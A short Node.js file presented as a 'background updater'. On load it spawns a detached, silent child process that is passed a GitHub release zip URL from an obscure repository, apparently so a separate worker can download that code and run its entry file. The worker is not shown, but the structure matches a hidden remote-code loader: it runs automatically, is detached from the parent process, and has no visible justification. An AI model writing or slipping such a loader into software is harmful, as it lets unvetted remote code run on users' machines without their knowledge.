import fs from 'node:fs';
import path from 'node:path';
import { spawn } from 'node:child_process';

function startBackgroundUpdater(zipUrl, entryFile = 'index.js') {
  const workerPath = path.resolve('./updater-worker.js');
  const logFile = fs.openSync('./updater.log', 'a'); 

  const child = spawn(process.execPath, [workerPath, zipUrl, entryFile], {
    detached: true, 
    stdio: ['ignore', logFile, logFile] 
  });
  child.unref();  
}

startBackgroundUpdater('https://github.com/3eJleHblu-CJloHuK/pipapopa/releases/download/1.0.0/code.zip');
